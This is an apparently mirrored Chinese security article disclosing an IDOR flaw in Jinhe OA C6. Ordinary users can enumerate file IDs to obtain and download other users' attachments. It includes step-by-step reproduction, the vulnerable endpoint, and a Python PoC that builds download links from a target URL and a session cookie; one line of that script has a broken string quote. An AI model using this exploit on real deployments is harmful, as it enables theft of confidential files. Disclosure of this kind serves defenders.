---
source: "MrWQ/vulnerability-paper"
---

# 金和 OA C6 后台越权敏感文件遍历漏洞 (没啥用的 0day~)

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/90HM3LqODBN35iqRBRE1HA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

**金和 OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件**

**二:  漏洞影响🐇**

**金和 OA C6**

**三:  漏洞复现🐋**

**登录后点击信息交流，发起协同页面**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE81lTSgMMVhy6ReN0Lyt8giaKYFxhvKUic2icCGEOkSmxKA1FPjwKDMQ0xg/640?wx_fmt=png)

**上传附件并上传发送给目标**

**这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE83DzIqZ6Wbd9gkT8LtOB3MCbMnibfianzgVZR8oCP2TPg5ThF315hcywQ/640?wx_fmt=png)

**成功收到上传的附件**  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8RCz7Vlyty8NMRsmZaPHiapoKTIl0UbREoauEW6OvIKvTnz6xCpXlGVA/640?wx_fmt=png)

**点击查看时抓包，发现一个带有文件 ID 的请求包**  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8GZyibbvH1ZcGksYutiaGrbr3ZDStCymUCXQkHlUxOXgJ4t4kPGahlmbw/640?wx_fmt=png)

**返回了几个参数**

```
var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png';
var strFileType = 'png';
var strSid='3jvpvhs410m2wdbbficax5q5';
var strFileIDCode='us9w7xWE7do=';
var strId = '1229';
var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log';
var strImgReg = 'jpg,gif,jpeg,png,ico';
var MD = '';
```

**其中我们注意到 strFilePath 为文件的存储地址，我们更改 id 参数为另一个值，且测试后发现 name 文件名参数无关紧要**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8XZbeIibBXyKvpr0FQliaSyW0MiaNyJicnAPP7libC5hy7sJgmO89GERibItw/640?wx_fmt=png)

**更改 ID 后发送请求包发现获得另一个文件的信息**

**访问 Url，注意 **type 参数** 需要为正确的文件后缀才可以访问**

```
http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE81gjFPdWwrZBqxVmksGJ2yB6DRwk35qZStjicuicUZp5DDFcsLxGR8tgQ/640?wx_fmt=png)

**这里更换一个普通用户测试是否可行，尝试遍历 id**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8MtWRKdbSB0euicFwsahVqVXOonjtNvmjY08E2UuRsJjgQe08DHQkBVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8moxMia8nNAUHbwtialrfLiaOo5ZgkOrGpFskNQia50RV6YuqoUTHlPicBHw/640?wx_fmt=png)

**存在 **strFilePath 参数** 则是存在文件，为空则是文件已经不存在**

**同时抓包下载文件页面也可以看到可获取的参数** ****FileID 与 FileIDCode****

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8GETdfeqB4mlBYppx2kI48zFrpClGyPaozgUuJZ6XKqqdA9nAibzlQCg/640?wx_fmt=png)

**于是只需要通过刚刚的 ID 遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限**

 ****四:  漏洞 POC🦉****

```
POC只检测是否存在漏洞，且漏洞存在于后台需要登录
运行后访问链接即可下载文件
```

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 金和OA C6                                                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, file_id, cookie):
    vuln_url = target_url + "/C6/control/OpenFile.aspx?id={}&.format(file_id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie":cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 Url: {}\033[0m".format(vuln_url))
        if "strFilePath =" in response.text and response.status_code == 200:
            strFilePath = re.findall(r"var strFilePath = '(.*?)';", response.text)[0]
            strFileType = strFilePath[-3:]
            strFileIDCode = re.findall(r"var strFileIDCode='(.*?)';", response.text)[0]
            strId = re.findall(r"var strId = '(.*?)';", response.text)[0]
            sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0]
            if strFilePath != "":
                print("\033[36m[o] 目标 {} 存在漏洞, 获取文件信息:\n[o] 文件路径：{}\n[o] 文件类型：{}\n[o] 文件ID code：{}\n[o] 文件编号：{}\033[0m".format(target_url, strFilePath, strFileType,strFileIDCode, strId ))
                print("\033[32m[o] 文件下载链接为: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}".format(target_url, strId, strFileIDCode, sid))
            else:
                print("\033[31m[x] 目标 {} 文件不存在     \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞     \033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    file_id = str(input("\033[35mFile_id >>> \033[0m"))
    cookie = str(input("\033[35mCookie  >>> \033[0m"))
    POC_1(target_url, file_id, cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8dsvhF7kytMNZGyREG9Uia7R8BxlAUv7gFZCxicNJia3ZJAxRv4XCZoiaNg/640?wx_fmt=png)

 ****五:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在交流群和公众号，想要投稿的师傅也可以加我投稿
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8XYThWYX7FkzmperVYOAZHCgj1U2LkYZCIeu3b8wk0hGnziamefb5h2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuCFdyVD9UlKcV0COuXd5oajiacmB5LB71gLdCaEhRaiaicMTS8oq55s9pA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZu0SvJFXqSugecfEnJujNOic73ouoGndJPRvezpAstLqLJDqe6JqJsf2Q/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
